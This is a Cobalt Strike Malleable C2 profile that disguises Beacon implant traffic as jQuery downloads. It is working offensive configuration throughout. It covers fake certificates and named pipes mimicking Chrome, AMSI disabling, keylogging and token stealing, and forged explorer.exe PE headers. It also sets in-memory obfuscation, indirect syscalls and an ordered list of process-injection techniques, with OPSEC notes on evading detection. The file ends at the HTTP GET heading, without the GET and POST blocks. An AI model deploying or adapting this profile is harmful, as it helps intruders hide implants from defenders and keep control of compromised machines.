# Malleable C2 Profile
# Version: CobaltStrike 4.9
# File: jquery-c2.4.9.profile
# Description: 
#    c2 profile attempting to mimic a jquery.js request
#    uses signed certificates
#    or self-signed certificates
# Authors: @joevest, @andrewchiles, @001SPARTaN, @Charles-Foster-Kane

################################################
## Tips for Profile Parameter Values
################################################
## 1st, RTFM
## https://www.cobaltstrike.com/support/
##
## Parameter Values
## Enclose parameter in Double quote, not single
##      set useragent "SOME AGENT";   GOOD
##      set useragent 'SOME AGENT';   BAD

## Some special characters do not need escaping 
##      prepend "!@#$%^&*()";

## Semicolons are ok
##      prepend "This is an example;";

## Escape Double quotes
##      append "here is \"some\" stuff";

## Escape Backslashes 
##      append "more \\ stuff";

## HTTP Values
## Program .http-post.client must have a compiled size less than 252 bytes.

################################################
## Profile Name
################################################
## Description:
##    The name of this profile (used in the Indicators of Compromise report)
## Defaults:
##    sample_name: My Profile
## Guidelines:
##    - Choose a name that you want in a report
set sample_name "jQuery CS 4.9 Profile";

################################################
## Sleep Times
################################################
## Description:
##    Timing between beacon check in
## Defaults:
##    sleeptime: 60000
##    jitter: 0
## Guidelines:
##    - Beacon Timing in milliseconds (1000 = 1 sec)
set sleeptime "70000";         # 45 Seconds
#set sleeptime "300000";       # 5 Minutes
#set sleeptime "600000";      # 10 Minutes
#set sleeptime "900000";      # 15 Minutes
#set sleeptime "1200000";      # 20 Minutes
#set sleeptime "1800000";      # 30 Minutes
#set sleeptime "3600000";      # 1 Hours
set jitter    "30";            # % jitter

################################################
##  Server Response Size jitter
################################################
##  Description:
##   Append random-length string (up to data_jitter value) to http-get and http-post server output.
set data_jitter "100";          

################################################
##  HTTP Client Header Removal
################################################
##  Description:
##      Global option to force Beacon's WinINet to remove specified headers late in the HTTP/S transaction process.
## Value:
##      headers_remove              Comma-separated list of HTTP client headers to remove from Beacon C2.
# set headers_remove "Strict-Transport-Security, header2, header3";

################################################
## Beacon User-Agent
################################################
## Description:
##    User-Agent string used in HTTP requests, CS versions < 4.2 approx 128 max characters, CS 4.2+ max 255 characters
## Defaults:
##    useragent: Internet Explorer (Random)
## Guidelines
##    - Use a User-Agent values that fits with your engagement
##    - useragent can only be 128 chars
## IE 10
# set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)";
## MS IE 11 User Agent
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36";

################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
    
    ## Option 1) Trusted and Signed Certificate
    ## Use keytool to create a Java Keystore file. 
    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
   
    ## Option 2) Create your own Self-Signed Certificate
    ## Use keytool to import your own self signed certificates

    #set keystore "/pathtokeystore";
    #set password "password";

    ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   "JP";
    set CN  "yuzu-soft.com";
    set O   "YUZUSOFT";
    set OU  "Certificate Authority";
    set validity "365";
}

################################################
## Task and Proxy Max Size
################################################
## Description:
##    Added in CS4.6
##    Control how much data (tasks and proxy) is transferred through a communication channel
## Defaults:
##    tasks_max_size "1048576";         # 1 MB
##    tasks_proxy_max_size "921600";    # 900 KB
##    tasks_dns_proxy_max_size "71680"; # 70 KB
## Guidelines
##    - For tasks_max_size determine the largest task that will be sent to your target(s).
##      This setting is patched into beacon when it is generated, so the size
##      needs to be determined prior to generating beacons for your target(s).
##      If a beacon within a communication chain does not support the received task size
##      it will be ignored.
##    - It is recommended to not modify the proxy max sizes
##
set tasks_max_size "2097152"; # Changed to 2 MB to support larger assembly files
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";  

################################################
## HTTP Beacon
################################################
## Description:
##   Allows you to specify attributes for general attributes for the http(s) beacons.
## Values:
##    library       wininet             CS 4.9 - The library attribute allows user to specify the default library used by the generated beacons used by the profile. The library defaults to "wininet", which is the only type of beacon prior to version 4.9. The library value can be "wininet" or "winhttp".
##
http-beacon {
    # Change the default HTTP Beacon library type used by the generated beacons
    set library "winhttp";
}

################################################
## TCP Beacon
################################################
## Description:
##    TCP Beacon listen port
##     - https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/
##     - https://www.cobaltstrike.com/help-tcp-beacon
##    TCP Frame Header
##     - Added in CS 4.1, prepend header to TCP Beacon messages
## Defaults:
##    tcp_port: 4444
##    tcp_frame_header: N\A
## Guidelines
##    - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port.
##    - Use a port other that default. Choose something not is use.
##    - Use a port greater than 1024 is generally a good idea
set tcp_port "42585";
set tcp_frame_header "\x80";

################################################
## SMB beacons
################################################
## Description:
##    Peer-to-peer beacon using SMB for communication
##    SMB Frame Header
##     - Added in CS 4.1, prepend header to SMB Beacon messages
## Defaults:
##    pipename: msagent_##
##    pipename_stager: status_##
##    smb_frame_header: N\A
## Guidelines:
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict!
##    - the ## is replaced with a number unique to a teamserver     
## ---------------------
set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe
set smb_frame_header "\x80";

################################################
## DNS beacons
################################################
## Description:
##    Beacon that uses DNS for communication
## Defaults:
##    dns_idle: 0.0.0.0
##    dns_max_txt: 252
##    dns_sleep: 0
##    dns_stager_prepend: N/A
##    dns_stager_subhost: .stage.123456.
##    dns_ttl: 1
##    maxdns: 255
##    beacon: N/A
##    get_A:  cdn.
##    get_AAAA: www6.
##    get_TXT: api.
##    put_metadata: www.
##    put_output: post.
##    ns_reponse: drop
## Guidelines:
##    - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "74.125.196.113"; #google.com (change this to match your campaign)
    set dns_max_txt        "252";
    set dns_sleep          "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
    set dns_ttl            "5";
    set maxdns             "255";
    set dns_stager_prepend ".resources.123456.";
    set dns_stager_subhost ".feeds.123456.";

    # DNS subhosts override options, added in version 4.3
    set beacon           "a.bc.";
    set get_A            "b.1a.";
    set get_AAAA         "c.4a.";
    set get_TXT          "d.tx.";
    set put_metadata     "e.md.";
    set put_output       "f.po.";
    set ns_response      "zero";
}

################################################
## SSH beacons
################################################
## Description:
##    Peer-to-peer SSH pseudo-Beacon for lateral movement
##    ssh_banner
##    - Added in Cobalt Strike 4.1, changes client SSH banner
## Defaults:
##    ssh_banner: Cobalt Strike 4.2
set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename      "wkssvc##";

################################################
## Staging process
################################################
## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads
## Description:
##    Malleable C2's http-stager block customizes the HTTP staging process
## Defaults:
##    uri_x86 Random String
##    uri_x64 Random String
##    HTTP Server Headers - Basic HTTP Headers
##    HTTP Client Headers - Basic HTTP Headers
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Only specify the `Host` header when peforming domain fronting. Be aware of HTTP proxy's rewriting your request per RFC2616 Section 14.23
##      - https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)

set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
#set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set

http-stager {  
    set uri_x86 "/api/js/jquery-3.3.1.js";
    set uri_x64 "/api/js/jquery-3.3.2.js";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line            
            prepend "!function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&&(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&&(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&&\"length\"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&(\"array\"===n||0===t||\"number\"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        #header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}

################################################
## Post Exploitation
################################################
## Description:
##    Controls post-exploitation jobs, including default x86/x64 program to open and inject shellcode into, AMSI bypass for execute-assembly, powerpick, and psinject
##    https://www.cobaltstrike.com/help-malleable-postex
## Values:
##    spawnto_x86       %windir%\\syswow64\\rundll32.exe
##    spawnto_x64       %windir%\\sysnative\\rundll32.exe
##    obfuscate         false                                   CS 3.14 - Scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way
##    pipename          postex_####, windows\\pipe_##           CS 4.2 - Change the named pipe names used, by post-ex DLLs, to send output back to Beacon. This option accepts a comma-separated list of pipenames. Cobalt Strike will select a random pipe name from this option when it sets up a post-exploitation job. Each # in the pipename is replaced with a valid hex character as well.
##    smartinject       false                                   CS 3.14 added to postex block - Directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs.
##    amsi_disable      false                                   CS 3.13 - Directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    keylogger         GetAsyncKeyState                        CS 4.2 - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to observe keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to observe keystrokes.
##    threadhint                                                CS 4.2 - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address. Specify the thread hint as "module!function+0x##" to specify the start address to spoof. The optional 0x## part is an offset added to the start address.
##    cleanup           false                                   CS 4.9 - Cleans up the post-ex UDRL memory when the post-ex DLL is loaded.

## Guidelines
##    - spawnto can only be 63 chars
##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
##      - sysnative for x64 and syswow64 for x86
##      - Example x64 : C:\\Windows\\sysnative\\w32tm.exe
##        Example x86 : C:\\Windows\\syswow64\\w32tm.exe
##    - The binary doesnt do anything wierd (protected binary, etc)
##    - !! Don't use these !! 
##    -   "csrss.exe","logoff.exe","rdpinit.exe","bootim.exe","smss.exe","userinit.exe","sppsvc.exe"
##    - A binary that executes without the UAC
##    - 64 bit for x64
##    - 32 bit for x86
##    - You can add command line parameters to blend
##      - set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
##      - set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
##      - Note: svchost.exe may look weird as the parent process 
##    - The obfuscate option scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way. It’s very similar to the obfuscate and userwx options available for Beacon via the stage block.
##    - The amsi_disable option directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    - The smartinject option directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll
post-ex {
    # Optionally specify non-existent filepath to force manual specification based on the Beacon host's running processes
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";
    # Modify our post-ex pipe names
    set pipename "Winsock2\\CatalogChangeListener-###-0,";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}

################################################
## Steal Token Access Mask
################################################
## Description:
##    Added in CS4.7
##    Allows you to set a default OpenProcessToken access mask used for steal_token and bsteal_token
## Defaults:
##    steal_token_access_mask "0";         # TOKEN_ALL_ACCESS
## Guidelines
##    - Suggested values: 0 = TOKEN_ALL_ACCESS or 11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8)
##    - Can be helpful for stealing tokens from processes using 'SYSTEM' user and you have this error: Could not open process token: {pid} (5)
##    - Refer to
##       https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm
##
set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS

################################################
## Memory Indicators
################################################
## Description:
##    The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon Reflective DLL.
## Values:
##    allocator         VirtualAlloc            CS 4.2 - Set how Beacon's Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
##    checksum          0                       The CheckSum value in Beacon's PE header
##    cleanup           false                   Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
##    compile_time      14 July 2009 8:14:00    The build time in Beacon's PE header
##    entry_point       92145                   The EntryPoint value in Beacon's PE header
##    image_size_x64    512000                  SizeOfImage value in x64 Beacon's PE header
##    image_size_x86    512000                  SizeOfImage value in x86 Beacon's PE header
##    magic_mz_x86      MZRE                    CS 4.2 - Override the first bytes (MZ header included) of Beacon's Reflective DLL. Valid x86 instructions are required. Follow instructions that change CPU state with instructions that undo the change.
##    magic_mz_x64      MZAR                    CS 4.2 - Same as magic_mz_x86; affects x64 DLL.
##    module_x64        xpsservices.dll         Same as module_x86; affects x64 loader
##    module_x86        xpsservices.dll         Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
##    magic_pe          PE                      Override the PE character marker used by Beacon's Reflective Loader with another value.
##    name	            beacon.x64.dll          The Exported name of the Beacon DLL
##    obfuscate         false                   Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers. As of 4.2 CS now obfuscates .text section in rDLL package
##    rich_header       N/A                     Meta-information inserted by the compiler
##    sleep_mask        false                   CS 3.12 - Obfuscate Beacon (HTTP, SMB, TCP Beacons), in-memory, prior to sleeping (HTTP) or waiting for a new connection\data (SMB\TCP)
##    smartinject       false                   CS 4.1 added to stage block - Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT
##    stomppe           true                    Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
##    userwx            false                   Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
## Guidelines:
##    - Modify the indicators to minimize in memory indicators
##    - Refer to 
##       https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/
##       https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK
##       https://www.youtube.com/watch?v=AV4XjxYe4GM (Obfuscate and Sleep)
stage {
    
    # CS 4.2 added allocator and MZ header overrides
    set allocator      "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
    #set magic_mz_x86   "MZRE";
    #set magic_mz_x64   "MZAR";
    set magic_pe       "NO";
    set userwx         "false"; 
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    # CS 3.12 Addition "Obfuscate and Sleep"
    set sleep_mask     "true";
    # CS 4.1  
    set smartinject    "true";

    # Make the Beacon Reflective DLL look like something else in memory
    # Values captured using peclone agaist a Windows 10 version of explorer.exe
    set checksum       "0";
    set compile_time   "11 Nov 2019 04:08:32";
    set entry_point    "650688";
    set image_size_x86 "4661248";
    set image_size_x64 "4661248";
    set name           "srv.dll";
    set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ## WARNING: Module stomping 
    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.
    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4

    # set module_x64 "netshell.dll";
    # set module_x86 "netshell.dll";

    # CS 4.8 - Added default syscall method option. This option supports: None, Direct, and Indirect.
    set syscall_method "Indirect";
    
    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # transform the x86 rDLL stage
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
        strrep "ReflectiveLoader" "execute"; # Change this text
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
    }
    transform-x64 { # transform the x64 rDLL stage
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
        strrep "ReflectiveLoader" "execute"; # Change this text in the Beacon DLL
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
    }

    stringw "Just"; # Add this string to the DLL
}

################################################
## Process Injection
################################################
## Description:
##    The process-inject block in Malleable C2 profiles shapes injected content and controls process injection behavior.
## Values:
##    allocator         VirtualAllocEx      The preferred method to allocate memory in the remote process. Specify VirtualAllocEx or NtMapViewOfSection. The NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for cross-arch memory allocations.
##    bof_allocator     VirtualAlloc        CS 4.7 - The preferred method to allocate memory in the current process to execute a BOF. Specify VirtualAlloc, MapViewOfFile, or HeapAlloc.
##    bof_reuse_memory  true                CS 4.7 - Determines whether or not memory is released. If this setting is “true”, memory is cleared and then reused for the next BOF execution; if this setting is “false”, memory is released and the appropriate memory free function is used, based on the bof_allocator setting.
##    min_alloc         4096                Minimum amount of memory to request for injected content.
##    startrwx          false               Use RWX as initial permissions for injected content. Alternative is RW.
##    userwx            false               Use RWX as final permissions for injected content. Alternative is RX.
## 
## 
## Use the transform-x86\x64 to pad content injected by Beacon
## Use the execute block to control use of Beacon's process injection techniques
## Guidelines:
##    - Modify the indicators to minimize in memory indicators
#     - Refer to 
##       https://www.cobaltstrike.com/help-malleable-c2#processinject
##       https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/
process-inject {

    # set a remote memory allocation technique: VirtualAllocEx|NtMapViewOfSection
    set allocator "NtMapViewOfSection";

    # CS 4.7 added memory allocation methods for BOF content in the current process
    set bof_allocator "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
    set bof_reuse_memory "true";

    # Minimium memory allocation size when injecting content
    set min_alloc "17500";
    
    # Set memory permissions as permissions as initial=RWX, final=RX
    set startrwx "false";
    set userwx   "false";

    # Transform injected content to avoid signature detection of first few bytes. Only supports prepend and append.
    transform-x86 {
        prepend "\x90\x90";
        #append "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
        #append "\x90\x90";
    }
  
    ## The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. The execute options include:
    #
    # Name                      x86->x64    x64-x86     Notes
    #########################################################################
    # CreateThread                                      Current Process only
    # CreateRemoteThread                       Yes      No cross-session
    # NtQueueApcThread                                  
    # NtQueAPCThread-s                                  This is the "Early Bird" injection technique. Suspended processes (e.g., post-ex jobs) only.
    # RtlCreateUserThread           Yes        Yes      Risky on XP-era targets; uses RWX shellcode for x86->x64 injection.
    # SetThreadContext                         Yes      Suspended processes (e.g. post-ex jobs only)
    execute {

        # The order is important! Each step will be attempted (if applicable) until successful
        ## self-injection
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;

        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
        # OPSEC - when you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
        # SetThreadContext;
        NtQueueApcThread-s;
        
        ## Injection into existing processes
        # OPSEC Uses RWX stub - Detected by Get-InjectedThread. Less detected by some defensive products.
        #NtQueueApcThread; 
        
        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
        # OPSEC - fires Sysmon Event 8
        CreateRemoteThread;
        
        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -> 64bit injection) AND injection across session boundaries
        # OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread
        RtlCreateUserThread; 
    }
}

################################################
## Maleable C2 
## https://www.cobaltstrike.com/help-malleable-c2#options
################################################
## HTTP Headers
################################################
## Description:
##    The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. Here, you may specify additional HTTP headers and the HTTP header order.
## Values:
##    set headers                   "Comma separated list of headers"    The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end.
##    header                        "headername" "header alue            The header keyword adds a header value to each of Cobalt Strike's HTTP responses. If the header value is already defined in a response, this value is ignored.
##    set trust_x_forwarded_for     "true"                               Adds this header to determine remote address of a request.
##    block_useragents              "curl*,lynx*,wget*"                  Default useragents that are blocked
## Guidelines:
##    - Use this section in addition to the "server" secion in http-get and http-post to further define the HTTP headers 
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
}

################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
